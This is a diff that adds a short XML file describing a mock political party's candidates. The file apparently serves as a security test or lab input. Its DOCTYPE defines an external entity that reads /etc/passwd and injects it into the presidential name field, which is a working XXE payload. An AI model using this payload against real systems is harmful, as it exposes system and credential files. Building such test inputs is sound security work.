@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE party [ <!ENTITY hello SYSTEM "file:///etc/passwd"> ]>
+<party>
+  <pres_candidate>
+      <pres_name>&hello;</pres_name>
+  </pres_candidate>
+  <vp_candidate>
+      <vp_name>Vice Presidential candidate name here</vp_name>
+  </vp_candidate>
+  <affiliation>Doggocratic Party</affiliation>
+</party>
